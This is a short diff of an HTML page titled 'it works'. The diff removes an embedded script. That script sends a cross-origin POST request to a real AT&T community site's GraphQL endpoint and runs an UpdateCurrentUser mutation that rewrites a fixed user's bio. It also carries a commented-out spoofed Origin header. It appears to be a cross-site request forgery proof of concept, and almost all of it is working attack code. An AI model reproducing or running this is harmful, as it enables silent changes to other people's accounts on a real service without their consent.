@@ -1,21 +1,3 @@
 <html>
     <h1>it works</h1>
-    <meta name="Origin" content="https://example.com/bizcommunity.att.com">
-    <script>
-        let xhr = new XMLHttpRequest();
-        xhr.open("POST", "https://bizcommunity.att.com/schema/community");
-        xhr.setRequestHeader("Accept", "application/json, text/plain, */*");
-        xhr.setRequestHeader("Content-Type", "application/json;charset=utf-8");
-        //xhr.setRequestHeader("Origin", "https://example.com/bizcommunity.att.com");
-
-        xhr.onreadystatechange = function () {
-          if (xhr.readyState === 4) {
-            console.log(xhr.status);
-            console.log(xhr.responseText);
-          }};
-
-        let data = `{"query":"\\n      mutation UpdateCurrentUser($input: UpdateCurrentUserInput!) {\\n        updateCurrentUser(input: $input) {\\n          member {\\n           \\n  \\n  id: userId\\n  username\\n  avatar\\n  fullName\\n  brandUser\\n  \\n  firstName\\n  lastName\\n  isSSO\\n  email\\n  bio\\n  screenerResponse\\n  screenerFilled\\n  signature\\n  optedOutOfChat\\n  isP2PAudioNotifEnabled\\n  employeeId\\n  chatTnCAccepted\\n  isRegCompleted\\n\\n           isVerified\\n          }\\n        }\\n      }\\n    ","variables":{"input":{"bio":"kkkkkkkkkkkkkkkkkkk","screenerResponse":{},"id":"63c2ecc4d7c1791e7f207d5a","clientMutationId":"1"}}}`;
-
-        xhr.send(data);
-    </script>
 </html>
